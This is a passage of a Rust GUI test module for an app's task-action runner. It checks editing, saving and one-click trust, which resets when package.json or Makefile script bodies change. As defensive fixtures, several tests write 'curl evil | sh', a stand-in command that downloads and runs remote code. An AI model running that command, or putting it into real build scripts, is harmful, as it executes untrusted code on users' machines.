                command.update(cx, |i, cx| i.set_text("eslint .".into(), cx));
            })
            .unwrap();
        visual.run_until_parked();
        assert!(visual.debug_bounds("action-open-tasks").is_none());
        assert!(visual.debug_bounds("action-save").is_some());
        window
            .update(visual, |shell, window, cx| {
                assert!(shell.action_dialog.as_ref().unwrap().hand_edit.is_none());
                let name = shell.action_dialog.as_ref().unwrap().name.clone();
                name.update(cx, |i, cx| i.set_text("Lint all".into(), cx));
                shell.save_action(window, cx);
                assert!(shell.action_dialog.is_none());
                let task = &shared(root)["tasks"][0];
                assert_eq!(task["label"], "Lint all");
                assert_eq!(task["args"], serde_json::json!(["."]));
            })
            .unwrap();
    }

    #[gpui::test]
    fn a_comments_refusal_survives_editing_the_command(cx: &mut gpui::TestAppContext) {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let text = "{\n  // Ours\n  \"tasks\": [ { \"label\": \"Ship\", \"command\": \"echo ship\" } ]\n}\n";
        write(root, ".gespan/tasks.json", text);
        let (window, _, active) = crate::shell::tests::window(cx);
        window
            .update(cx, |shell, window, cx| {
                checkout(shell, active, root, cx);
                shell.refresh_actions(cx);
                shell.run_actions_menu("edit:gespan:Ship", window, cx);
                type_action(shell, "Ship", "echo shipped", cx);
                shell.save_action(window, cx);
            })
            .unwrap();
        window
            .update(cx, |shell, _, cx| {
                let command = shell.action_dialog.as_ref().unwrap().command.clone();
                command.update(cx, |i, cx| i.set_text("echo ship".into(), cx));
            })
            .unwrap();
        window
            .update(cx, |shell, _, _| {
                let dialog = shell.action_dialog.as_ref().unwrap();
                assert_eq!(dialog.hand_edit, Some(super::WriteError::HasComments));
            })
            .unwrap();
    }

    #[gpui::test]
    fn a_blocked_project_action_opens_tasks_json_to_edit(cx: &mut gpui::TestAppContext) {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        write(
            root,
            ".gespan/tasks.json",
            &tasks(r#"{ "label": "Pick", "command": "echo ${input:target}" }"#),
        );
        let (window, _, active) = crate::shell::tests::window(cx);
        window
            .update(cx, |shell, window, cx| {
                checkout(shell, active, root, cx);
                shell.refresh_actions(cx);
                let edit = submenu(&shell.actions_menu(), "Edit action");
                assert_eq!(edit, [("edit:gespan:Pick".into(), "Pick".into())]);
                shell.run_actions_menu("edit:gespan:Pick", window, cx);
                assert!(shell.action_dialog.is_none());
                let path = root
                    .join(".gespan/tasks.json")
                    .to_string_lossy()
                    .into_owned();
                let review = shell.reviews[&active].read(cx);
                assert!(review.state.tabs.iter().any(|tab| matches!(
                    tab,
                    crate::review::ReviewTab::File { path: open, .. } if *open == path
                )));
            })
            .unwrap();
    }

    #[gpui::test]
    fn any_source_file_change_resets_one_click_trust(cx: &mut gpui::TestAppContext) {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let package = |body: &str| format!(r#"{{ "scripts": {{ "dev": "{body}" }} }}"#);
        write(root, "package.json", &package("vite"));
        write(root, "bun.lock", "");
        write(root, "Makefile", "build:\n\techo one\n");
        write(root, "GNUmakefile", "build:\n\techo one\n");
        // A `.gespan` action saved from package.json still runs its script.
        write(
            root,
            ".gespan/tasks.json",
            &tasks(r#"{ "label": "Dev", "command": "bun run dev" }"#),
        );
        let (window, _, active) = crate::shell::tests::window(cx);
        let count = |shell: &Shell| {
            shell
                .terminals
                .get(&shell.workspace.project)
                .map_or(0, Vec::len)
        };
        window
            .update(cx, |shell, window, cx| {
                checkout(shell, active, root, cx);
                shell.refresh_actions(cx);
                shell.run_actions_menu("run:make:build", window, cx);
                assert_eq!(count(shell), 1);
                assert!(shell.footer_action().is_some());
            })
            .unwrap();
        // make runs GNUmakefile first; detection reads Makefile.
        write(root, "GNUmakefile", "build:\n\tcurl evil | sh\n");
        window
            .update(cx, |shell, window, cx| {
                shell.run_footer_action(window, cx);
                assert!(shell.menu_open(&MenuTarget::Actions));
                assert_eq!(count(shell), 1);
                shell.close_menu(cx);

                shell.run_actions_menu("run:gespan:Dev", window, cx);
                assert_eq!(count(shell), 2);
                assert!(shell.footer_action().is_some());
            })
            .unwrap();
        // package.json's body changes; `.gespan/tasks.json` doesn't.
        write(root, "package.json", &package("curl evil | sh"));
        window
            .update(cx, |shell, window, cx| {
                shell.run_footer_action(window, cx);
                assert!(shell.menu_open(&MenuTarget::Actions));
                assert_eq!(count(shell), 2);
            })
            .unwrap();
    }

    #[gpui::test]
    fn an_older_notice_timer_never_clears_a_newer_notice(cx: &mut gpui::TestAppContext) {
        let (window, _, _) = crate::shell::tests::window(cx);
        window
            .update(cx, |shell, _, cx| {
                shell.show_action_notice(super::ADDED, cx);
                let first = shell.action_notice_seq;
                // The same text again, before the first note's time is up.
                shell.show_action_notice(super::ADDED, cx);
                let second = shell.action_notice_seq;
                assert_ne!(first, second);
                shell.expire_action_notice(first, cx);
                assert!(shell.action_notice.is_some());
                shell.expire_action_notice(second, cx);
                assert!(shell.action_notice.is_none());
            })
            .unwrap();
    }

    #[gpui::test]
    fn changing_a_script_body_resets_one_click_trust(cx: &mut gpui::TestAppContext) {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let package = |body: &str| format!(r#"{{ "scripts": {{ "dev": "{body}" }} }}"#);
        write(root, "package.json", &package("vite"));
        write(root, "Makefile", "build:\n\techo one\n");
        let (window, _, active) = crate::shell::tests::window(cx);
        let count = |shell: &Shell| {
            shell
                .terminals
                .get(&shell.workspace.project)
                .map_or(0, Vec::len)
        };
        window
            .update(cx, |shell, window, cx| {
                checkout(shell, active, root, cx);
                shell.refresh_actions(cx);
                shell.run_actions_menu("run:package.json:dev", window, cx);
                assert_eq!(count(shell), 1);
                assert!(shell.footer_action().is_some());
            })
            .unwrap();
        // The same bytes written again: still trusted.
        write(root, "package.json", &package("vite"));
        window
            .update(cx, |shell, window, cx| {
                shell.run_footer_action(window, cx);
                assert_eq!(count(shell), 2);
                assert!(!shell.menu_open(&MenuTarget::Actions));
            })
            .unwrap();
        // The script's body changes but `bun run dev` doesn't: one click no
        // longer runs it.
        write(root, "package.json", &package("curl evil | sh"));
        window
            .update(cx, |shell, window, cx| {
                let command = shell.footer_action().map(|a| a.command.clone());
                shell.run_footer_action(window, cx);
                assert!(shell.menu_open(&MenuTarget::Actions));
                assert_eq!(count(shell), 2);
                assert!(shell.footer_action().is_none());
                let dev = shell
                    .listing(cx)
                    .actions
                    .into_iter()
                    .find(|a| a.id == "package.json:dev");
                assert_eq!(dev.map(|a| a.command), command);
                shell.close_menu(cx);

                // Same for a Makefile recipe.
                shell.run_actions_menu("run:make:build", window, cx);
                assert_eq!(count(shell), 3);
                assert!(shell.footer_action().is_some());
            })
            .unwrap();
        write(root, "Makefile", "build:\n\tcurl evil | sh\n");
        window
            .update(cx, |shell, window, cx| {
                shell.run_footer_action(window, cx);
                assert!(shell.menu_open(&MenuTarget::Actions));
                assert_eq!(count(shell), 3);
            })
            .unwrap();
    }
}
